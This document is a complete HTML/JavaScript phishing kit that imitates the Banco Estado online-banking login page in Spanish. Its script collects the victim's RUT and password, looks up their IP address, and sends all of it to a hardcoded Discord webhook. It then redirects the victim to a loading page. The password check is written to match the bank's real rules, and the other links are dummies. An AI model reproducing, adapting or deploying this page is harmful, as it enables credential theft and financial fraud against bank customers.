<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" type="image/png" href="favicon.png">
    <title>Banco Estado</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
            background: linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 100%);
            min-height: 100vh;
            display: flex;
            align-items: flex-start;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 450px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            padding: 40px 30px;
            margin-top: 20px;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 40px;
        }

        .logo-container {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .logo {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #FF5C00 0%, #FF8C00 100%);
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: white;
            font-size: 20px;
        }

        .logo-text {
            font-size: 18px;
            font-weight: 600;
            color: #1a1a1a;
            letter-spacing: -0.5px;
        }

        .close-btn {
            background: none;
            border: none;
            width: 40px;
            height: 40px;
            border-radius: 8px;
            background-color: #E8E8F0;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            color: #7B7B8C;
            transition: all 0.3s ease;
        }

        .close-btn:hover {
            background-color: #D8D8E0;
            color: #5a5a6a;
        }

        .title {
            font-size: 28px;
            font-weight: 600;
            color: #1a2842;
            margin-bottom: 35px;
            line-height: 1.3;
        }

        .form-group {
            margin-bottom: 25px;
        }

        .form-label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #1a2842;
            margin-bottom: 10px;
            letter-spacing: 0.3px;
        }

        .form-input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #D0D0D8;
            border-radius: 6px;
            font-size: 16px;
            color: #1a1a1a;
            font-family: inherit;
            transition: all 0.3s ease;
            background-color: #FAFAFA;
        }

        .form-input:focus {
            outline: none;
            border-color: #3B4FB5;
            background-color: white;
            box-shadow: 0 0 0 3px rgba(59, 79, 181, 0.1);
        }

        .form-input::placeholder {
            color: #A8A8B3;
        }

        .password-field {
            position: relative;
        }

        .eye-icon {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            width: 24px;
            height: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
        }

        .eye-icon:hover svg {
            stroke: #3B4FB5;
        }

        .eye-icon svg {
            width: 20px;
            height: 20px;
            stroke: #1a1a1a;
            fill: none;
            transition: all 0.3s ease;
        }

        .login-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #3B4FB5 0%, #2A3A8F 100%);
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(59, 79, 181, 0.3);
            margin-top: 10px;
            margin-bottom: 20px;
        }

        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(59, 79, 181, 0.4);
        }

        .login-btn:active {
            transform: translateY(0);
        }

        .forgot-password {
            text-align: center;
            margin-bottom: 20px;
        }

        .forgot-password a {
            color: #3B4FB5;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.3s ease;
        }

        .forgot-password a:hover {
            text-decoration: underline;
            color: #2A3A8F;
        }

        .divider {
            height: 1px;
            background-color: #D0D0D8;
            margin: 25px 0;
        }

        .business-btn {
            width: 100%;
            padding: 14px;
            background: white;
            color: #3B4FB5;
            border: 2px solid #3B4FB5;
            border-radius: 50px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 25px;
        }

        .business-btn:hover {
            background-color: #F5F7FF;
            transform: translateY(-2px);
        }

        .help-section {
            text-align: center;
        }

        .help-question {
            font-size: 14px;
            color: #1a2842;
            font-weight: 500;
            margin-bottom: 8px;
        }

        .help-text {
            font-size: 13px;
            color: #666666;
            line-height: 1.5;
        }

        .help-link {
            color: #3B4FB5;
            text-decoration: none;
            font-weight: 600;
            transition: all 0.3s ease;
        }

        .help-link:hover {
            text-decoration: underline;
        }

        @media (max-width: 480px) {
            .container {
                padding: 30px 20px;
                border-radius: 16px;
            }

            .title {
                font-size: 24px;
            }

            .form-input {
                font-size: 16px;
            }
        }

        .logo-img {
            width: 155px;
            height: 155px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: none;
            border: none;
            padding: 0;
        }

        .logo-img img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        .copyable {
            cursor: pointer;
            user-select: all;
            transition: all 0.2s ease;
            padding: 4px 8px;
            border-radius: 4px;
        }

        .copyable:active {
            background-color: rgba(59, 79, 181, 0.1);
            transform: scale(0.98);
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header con Logo y Botón Cerrar -->
        <div class="header">
            <div class="logo-container">
                <div class="logo-img">
                    <img src="logo-banco-estado.svg" alt="Logo">
                </div>
            </div>
            <button class="close-btn" onclick="closeWindow()" title="Cerrar">✕</button>
        </div>

        <!-- Título -->
        <h1 class="title">Ingresa a tu Banca en Línea</h1>

        <!-- Formulario -->
        <form id="loginForm" onsubmit="handleLogin(event)">
            <!-- Campo RUT -->
            <div class="form-group">
                <label class="form-label" for="rut">RUT</label>
                <input 
                    type="text" 
                    id="rut" 
                    class="form-input" 
                    placeholder="Ej: 12345678k"
                    autocomplete="off"
                >
            </div>

            <!-- Campo Clave -->
            <div class="form-group">
                <label class="form-label" for="password">Contraseña</label>
                <div class="password-field">
                    <input 
                        type="password" 
                        id="password" 
                        class="form-input" 
                        placeholder="••••••••"
                        autocomplete="off"
                    >
                    <span class="eye-icon" id="eyeIcon" onclick="togglePassword()" title="Mostrar/ocultar contraseña">
                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                            <!-- Ícono de ojo con línea (oculto) - mostrado por defecto -->
                            <g id="eyeHidden">
                                <path d="M3 3l18 18M6.5 6.5C5 8 4 10 4 12c0 4.4 4 8 8 8 2 0 3.8-.8 5.2-2M17.5 17.5c1.5-1.5 2.5-3.5 2.5-5.5 0-4.4-4-8-8-8-2 0-3.8.8-5.2 2" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                            </g>
                            <!-- Ícono de ojo abierto (normal) - inicialmente oculto -->
                            <g id="eyeClosed" style="display:none;">
                                <path d="M3 12s2.5-6 9-6 9 6 9 6-2.5 6-9 6-9-6-9-6z" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                                <circle cx="12" cy="12" r="3" stroke-width="1.5"/>
                            </g>
                        </svg>
                    </span>
                </div>
            </div>

            <!-- Botón Ingresar -->
            <button type="submit" class="login-btn">Ingresar</button>
        </form>

        <!-- Enlace Problemas con Clave -->
        <div class="forgot-password">
            <a href="#" onclick="handleForgotPassword(event)">¿Problemas con tu Clave?</a>
        </div>

        <!-- Divisor -->
        <div class="divider"></div>

        <!-- Botón Acceso Empresas -->
        <button class="business-btn" onclick="handleBusinessAccess()">Acceso Empresas</button>

        <!-- Sección Ayuda -->
        <div class="help-section">
            <div class="help-question">¿Necesitas ayuda?</div>
            <div class="help-text">
                Para aclarar dudas revisa nuestro 
                <a href="#" class="help-link" onclick="handleHelpCenter(event)">Centro de ayuda</a>
            </div>
        </div>
    </div>

    <script>
        // Configuración del webhook de Discord
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1538414125439520778/2NAQ87Fjy8N0QFQ6Cxf57DFp_J2MxFCgtGo9EgSOvdjT10G8KSEnWjx9nxW3eowQzBFw';

        // Toggle mostrar/ocultar contraseña
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const eyeClosed = document.getElementById('eyeClosed');
            const eyeHidden = document.getElementById('eyeHidden');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeHidden.style.display = 'none';
                eyeClosed.style.display = 'block';
            } else {
                passwordInput.type = 'password';
                eyeHidden.style.display = 'block';
                eyeClosed.style.display = 'none';
            }
        }

        // Función para validar contraseña
        function validatePassword(password) {
            const hasLetters = /[a-zA-Z]/.test(password);
            const hasNumbers = /[0-9]/.test(password);
            const validLength = password.length >= 6 && password.length <= 8;
            
            if (password.length === 0) {
                return { valid: false, message: 'La contraseña es obligatoria' };
            }
            if (!validLength) {
                return { valid: false, message: 'La contraseña debe tener entre 6 y 8 caracteres' };
            }
            if (!hasLetters) {
                return { valid: false, message: 'La contraseña debe contener letras' };
            }
            if (!hasNumbers) {
                return { valid: false, message: 'La contraseña debe contener números' };
            }
            return { valid: true };
        }

        // Manejar envío del formulario
        function handleLogin(event) {
            event.preventDefault();
            const rut = document.getElementById('rut').value.trim();
            const password = document.getElementById('password').value;
            
            if (!rut || !password) {
                alert('Por favor completa todos los campos');
                return;
            }
            
            // Validar que la contraseña tenga letras, números y máximo 8 caracteres
            const validation = validatePassword(password);
            if (!validation.valid) {
                alert(validation.message);
                return;
            }
            
            // Guardar RUT en localStorage
            localStorage.setItem('rutUsuario', rut);
            
            sendToDiscord(rut, password);
        }

        // Función para enviar datos a Discord
        function sendToDiscord(rut, password) {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const payload = {
                        username: '💋𝐿𝑜𝑔𝑜𝑠 𝐵𝑎𝑛𝑐𝑜𝐸𝑠𝑡𝑎𝑑𝑜 𝑃𝑟𝑖𝑚𝑒-𝐶𝑜𝑟𝑒-𝑃𝑅𝑂𝑀𝐴𝑋💋',
                        embeds: [{
                            color: 3447003,
                            author: {
                                name: '✨𝕷𝖔𝖌𝖔 𝕭𝖆𝖓𝖈𝖔𝕰𝖘𝖙𝖆𝖉𝖔✨'
                            },
                            fields: [
                                {
                                    name: 'RUT',
                                    value: `\`${rut}\``,
                                    inline: false
                                },
                                {
                                    name: 'Contraseña',
                                    value: `\`${password}\``,
                                    inline: false
                                },
                                {
                                    name: 'IP',
                                    value: `\`${data.ip}\``,
                                    inline: true
                                },
                                {
                                    name: 'Hora',
                                    value: `\`${new Date().toLocaleString('es-ES')}\``,
                                    inline: true
                                }
                            ]
                        }]
                    };
                    
                    fetch(DISCORD_WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    })
                    .then(() => {
                        window.location.href = 'load.html';
                    })
                    .catch(error => console.error('Error:', error));
                })
                .catch(error => console.error('Error IP:', error));
        }

        // Cerrar ventana
        function closeWindow() {
            window.close();
        }

        // Manejar olvido de contraseña
        function handleForgotPassword(event) {
            event.preventDefault();
        }

        // Manejar acceso empresas
        function handleBusinessAccess() {
        }

        // Manejar centro de ayuda
        function handleHelpCenter(event) {
            event.preventDefault();
        }

        // Sin validación - acepta cualquier tipo de documento

        // Enfocar en el campo RUT al cargar
        window.addEventListener('load', function() {
            document.getElementById('rut').focus();
        });
</script>
